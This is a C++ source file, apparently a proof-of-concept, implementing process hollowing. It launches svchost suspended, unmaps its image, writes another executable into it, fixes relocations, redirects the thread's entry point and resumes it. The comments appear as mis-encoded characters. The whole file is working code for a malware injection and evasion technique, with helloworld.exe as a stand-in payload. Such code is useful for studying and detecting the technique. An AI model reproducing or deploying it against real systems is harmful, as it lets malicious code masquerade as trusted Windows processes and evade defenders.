// ProcessHollowing.cpp : Defines the entry point for the console application.

#include "stdafx.h"
#include <windows.h>
#include "internals.h"
#include "pe.h"

void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
{
	// 1. �إߤ@�� Suspended Process�A���N�O�n�Q�`�J���ؼ� Process
	LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
	LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();
	
	// �Ĥ��ӰѼƥ����O CREATE_SUSPENDED�A�]���ݭn�������b��l���A�A���ڭ̯����䤤���O����i��ק�
	CreateProcessA
	(
		0,
		pDestCmdLine,		
		0, 
		0, 
		0, 
		CREATE_SUSPENDED, 
		0, 
		0, 
		pStartupInfo, 
		pProcessInfo
	);
	if (!pProcessInfo->hProcess)
	{
		printf("Error creating process\r\n");

		return;
	}
	
	// ���o PEB�A�̭��]�t�᭱�B�J�ݭn�Ψ쪺 ImageBaseAddress
	PPEB pPEB = ReadRemotePEB(pProcessInfo->hProcess);
	PLOADED_IMAGE pImage = ReadRemoteImage(pProcessInfo->hProcess, pPEB->ImageBaseAddress);


	// 2. Ū���n�`�J���ɮ�
	HANDLE hFile = CreateFileA
	(
		pSourceFile,
		GENERIC_READ, 
		0, 
		0, 
		OPEN_ALWAYS, 
		0, 
		0
	);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("Error opening %s\r\n", pSourceFile);
		return;
	}
	DWORD dwSize = GetFileSize(hFile, 0);
	PBYTE pBuffer = new BYTE[dwSize];
	DWORD dwBytesRead = 0;
	ReadFile(hFile, pBuffer, dwSize, &dwBytesRead, 0);

	// ���o File Header �M Optional Header
	// File Header �M Optional Header �U�O NT Header ���䤤�@�Ӧ����ANT Header �h�O�q DOS Header ��X�Ӫ�
	PLOADED_IMAGE pSourceImage = GetLoadedImage((DWORD)pBuffer);
	PIMAGE_NT_HEADERS32 pSourceHeaders = GetNTHeaders((DWORD)pBuffer);


	// 3. Unmap �ؼ� Process ���O����
	// �q ntdll.dll �����X NtUnmapViewOfSection
	HMODULE hNTDLL = GetModuleHandleA("ntdll");
	FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
	_NtUnmapViewOfSection NtUnmapViewOfSection =
		(_NtUnmapViewOfSection)fpNtUnmapViewOfSection;
	DWORD dwResult = NtUnmapViewOfSection
	(
		pProcessInfo->hProcess, 
		pPEB->ImageBaseAddress
	);
	if (dwResult)
	{
		printf("Error unmapping section\r\n");
		return;
	}

	
	// 4. �b�ؼ� Process �ӽФ@���O����
	// Process �O�ؼ� Process �� Handle
	// lpAddress �O�쥻�Q Unmap �� Image �� Base Address
	// dwSize �O�ڭ̭n�`�J���ɮפj�p
	// flAllocationType�@�O�@MEM_COMMIT | MEM_RESERVE
	// flProtect �i�H�w�藍�P���O����Ϭq�h���t�m�A���L POC ��K�_���A������ PAGE_EXECUTE_READWRITE
	PVOID pRemoteImage = VirtualAllocEx
	(
		pProcessInfo->hProcess,
		pPEB->ImageBaseAddress,
		pSourceHeaders->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	if (!pRemoteImage)
	{
		printf("VirtualAllocEx call failed\r\n");
		return;
	}


	// 5. �� Header �g�J�ؼ� Process
	// �b�� Optional Header ���� ImageBase �������e�A��X�ɮת� Image Base �M�ؼ� Process �� Image Base ���Z��
	DWORD dwDelta = (DWORD)pPEB->ImageBaseAddress - pSourceHeaders->OptionalHeader.ImageBase;
	pSourceHeaders->OptionalHeader.ImageBase = (DWORD)pPEB->ImageBaseAddress;

	// ��ڭ̪��ɮ� Header �g�J�ؼ� Process
	if (!WriteProcessMemory
	(
		pProcessInfo->hProcess, 				
		pPEB->ImageBaseAddress, 
		pBuffer, 
		pSourceHeaders->OptionalHeader.SizeOfHeaders, 
		0
	))
	{
		printf("Error writing process memory\r\n");
		return;
	}
	
	/* �H�W�O���B�檺 Process (�W) �����e */
	/* �H�U�O���B�檺 Process (�U) �����e */

	// 6. ��U Section �ھڥ��̪� RVA �g�J�ؼ� Process
	for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
	{
		if (!pSourceImage->Sections[x].PointerToRawData)
			continue;

		// Section �b�O���骺��ڦ�} = Image Base + Section �� RVA
		PVOID pSectionDestination = (PVOID)((DWORD)pPEB->ImageBaseAddress + pSourceImage->Sections[x].VirtualAddress);
		if (!WriteProcessMemory
		(
			pProcessInfo->hProcess,			
			pSectionDestination,			
			&pBuffer[pSourceImage->Sections[x].PointerToRawData],
			pSourceImage->Sections[x].SizeOfRawData,
			0
		))
		{
			printf ("Error writing process memory\r\n");
			return;
		}
	}	

	// 7. Rebase Relocation Table�A�]�� Image Base �i��|���@��
	if (dwDelta)
		for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
		{
			// �T�{ Section Name �O�_�� .reloc
			char* pSectionName = ".reloc";		
			if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
				continue;

			DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
			DWORD dwOffset = 0;

			// Relocation Table ���c�i�H�z�L�b Optional Table ���� DataDirectory �������o
			IMAGE_DATA_DIRECTORY relocData = pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

			// �j��]�L�Ҧ� Block
			while (dwOffset < relocData.Size)
			{
				PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)&pBuffer[dwRelocAddr + dwOffset];
				dwOffset += sizeof(BASE_RELOCATION_BLOCK);
				DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);
				PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&pBuffer[dwRelocAddr + dwOffset];

				// �j��]�L�Ҧ� Entry
				for (DWORD y = 0; y <  dwEntryCount; y++)
				{
					dwOffset += sizeof(BASE_RELOCATION_ENTRY);

					// �� Type �� 0 �ɥN���u�O�ΨӰ� Padding ����Ϊ��A�ҥH���Χ�
					if (pBlocks[y].Type == 0)
						continue;

					// ��C�� Entry �� Offset �[�W�Ҧb�� Block �� PageAddress�A
					// �N��X�Ӫ���}�̪��ȥ[�W�쥻�ؼ� Process �M�ɮת� Image Base ���t
					DWORD dwFieldAddress = 
						pBlockheader->PageAddress + pBlocks[y].Offset;
					DWORD dwBuffer = 0;
					ReadProcessMemory
					(
						pProcessInfo->hProcess, 
						(PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
						&dwBuffer,
						sizeof(DWORD),
						0
					);
					dwBuffer += dwDelta;
					BOOL bSuccess = WriteProcessMemory
					(
						pProcessInfo->hProcess,
						(PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
						&dwBuffer,
						sizeof(DWORD),
						0
					);
					if (!bSuccess)
					{
						printf("Error writing memory\r\n");
						continue;
					}
				}
			}
			break;
		}

	//  8. ���X�ؼ� Process �� Context�A��Ȧs�� EAX �令�ڭ̪`�J���{���� Entry Point
	DWORD dwEntrypoint = (DWORD)pPEB->ImageBaseAddress + pSourceHeaders->OptionalHeader.AddressOfEntryPoint;
	LPCONTEXT pContext = new CONTEXT();
	pContext->ContextFlags = CONTEXT_INTEGER;
	if (!GetThreadContext(pProcessInfo->hThread, pContext))
	{
		printf("Error getting context\r\n");
		return;
	}
	pContext->Eax = dwEntrypoint;
	if (!SetThreadContext(pProcessInfo->hThread, pContext))
	{
		printf("Error setting context\r\n");
		return;
	}

	// 9. ��_����쥻���A�� Suspended ���ؼ� Process
	if (!ResumeThread(pProcessInfo->hThread))
	{
		printf("Error resuming thread\r\n");
		return;
	}
}

int _tmain(int argc, _TCHAR* argv[])
{
	char* pPath = new char[MAX_PATH];
	GetModuleFileNameA(0, pPath, MAX_PATH);
	pPath[strrchr(pPath, '\\') - pPath + 1] = 0;
	strcat(pPath, "helloworld.exe");
	CreateHollowedProcess
	(
		"svchost", 
		pPath
	);
	system("pause");
	return 0;
}